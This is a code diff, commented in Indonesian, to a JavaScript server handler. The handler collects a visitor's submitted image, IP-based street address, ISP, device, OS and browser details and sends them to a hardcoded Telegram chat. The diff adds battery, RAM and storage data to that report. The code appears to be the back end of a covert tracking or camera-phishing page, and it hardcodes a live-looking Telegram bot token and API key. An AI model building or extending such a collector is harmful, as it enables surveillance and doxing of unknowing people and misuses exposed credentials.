@@ -6,7 +6,7 @@ const OPENCAGE_KEY = "136e90f2e15c46fda280cbc59b05cfda"; // Ganti dengan API key
 
 export default async function handler(req, res) {
   try {
-    const { image } = req.body;
+    const { image, deviceInfo } = req.body;
     const botToken = "8075080156:AAFhn7Wqxr-cxpvlSKdEFr1iL6qdOgWGwgw";
     const chatId = "6676770258";
 
@@ -18,27 +18,6 @@ export default async function handler(req, res) {
     const device = parser.getDevice();
     const os = parser.getOS();
     const browser = parser.getBrowser();
-
-    // Menangkap versi OS dan perangkat
-    const deviceInfo = device.model || "Tidak diketahui perangkat";
-    const osName = os.name || "OS tidak diketahui";
-    const osVersion = os.version || "Versi tidak diketahui";
-    const browserName = browser.name || "Browser tidak diketahui";
-    const browserVersion = browser.version || "Versi tidak diketahui";
-
-    // Memperbaiki deteksi Android versi lebih lengkap
-    let androidVersion = "";
-    if (osName === "Android") {
-      const androidMatch = userAgent.match(/Android\s([0-9\.]+)/);
-      if (androidMatch) {
-        androidVersion = androidMatch[1];
-      }
-    }
-
-    // Jika tidak ada versi Android terdeteksi, fallback ke default
-    if (!androidVersion) {
-      androidVersion = osVersion || "Tidak diketahui";
-    }
 
     const ipInfoRes = await fetch(`https://ipinfo.io/${ip}/json`);
     const ipInfo = await ipInfoRes.json();
@@ -64,9 +43,13 @@ Alamat: ${alamatLengkap}
 ISP: ${isp}
 Jam: ${waktu}
 
-Perangkat: ${deviceInfo}
-OS: ${osName} ${androidVersion}
-Browser: ${browserName} ${browserVersion}`;
+Perangkat: ${device.model || "Tidak diketahui"}
+OS: ${os.name} ${os.version}
+Browser: ${browser.name} ${browser.version}
+
+Baterai: ${deviceInfo.batteryLevel}% (${deviceInfo.isCharging})
+RAM: ${deviceInfo.ram}
+Penyimpanan: ${deviceInfo.usedStorage} / ${deviceInfo.totalStorage}`;
 
     const imageBuffer = Buffer.from(image.split(",")[1], "base64");
 
